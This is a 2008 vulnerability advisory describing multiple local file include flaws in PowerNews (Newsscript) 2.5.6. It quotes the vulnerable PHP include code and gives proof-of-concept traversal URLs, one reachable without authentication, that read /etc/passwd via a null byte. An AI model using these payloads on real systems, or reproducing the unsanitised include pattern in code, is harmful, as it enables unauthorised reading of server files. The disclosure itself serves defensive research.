@@ -1,0 +1,88 @@
+Digital Security Research Group [DSecRG] Advisory       #DSECRG-08-014
+
+
+Application:                    PowerNews (Newsscript)
+Versions Affected:              2.5.6
+Vendor URL:                     http://www.powerscripts.org/
+Bug:                            Multiple Local File Include
+Exploits:                       YES
+Reported:                       01.02.2008
+Vendor Response:                none
+Solution:                       none
+Date of Public Advisory:        08.02.2008
+Authors:                        Alexandr Polyakov, Stas Svistunovich
+                                Digital Security Research Group [DSecRG] (research [at] dsec [dot] ru)
+
+
+
+Description
+***********
+
+PowerNews (Newsscript) has Multiple Local File Include vulnerabilities.
+
+
+1. Local File Include vulnerabilities found in scripts: 
+
+pnadmin/categories.inc.php
+pnadmin/news.inc.php
+pnadmin/other.inc.php
+pnadmin/permissions.inc.php
+pnadmin/templates.inc.php
+pnadmin/users.inc.php
+
+Non-authentication user can directly access to this scripts.
+
+Code
+****
+#################################################
+
+  if ($_GET[subpage]) {
+    if (file_exists($_GET[page]."_".$_GET[subpage].".inc.php")) {
+      include($_GET[page]."_".$_GET[subpage].".inc.php");
+    } else {
+      ?><center><?PHP echo L_ALL_SUBPAGENOTFOUND; ?></center><?PHP
+    }
+  } else {
+
+#################################################
+
+Example: 
+
+http://[server]/[installdir]/pnadmin/categories.inc.php?subpage=../../../../../../../../../../../../../etc/passwd%00
+
+
+2. Local File Include vulnerability found in script pnadmin/index.php in admin area.
+
+Administrator can include local files.
+
+Code
+****
+#################################################
+
+    if ($pnloggedin != "YES") {
+
+      include("login.inc.php");
+
+    } else {
+
+      if (!$_GET[page]) { $_GET[page] = "main"; }
+      if (file_exists($_GET[page].".inc.php")) { include($_GET[page].".inc.php"); } else {
+
+#################################################
+
+Example:
+
+http://[server]/[installdir]/pnadmin/index.php?page=../../../../../../../../../../../../../etc/passwd%00
+
+
+
+About
+*****
+
+Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.
+
+
+Contact:        research [at] dsec [dot] ru
+                http://www.dsec.ru (in Russian)
+
+# milw0rm.com [2008-02-08]
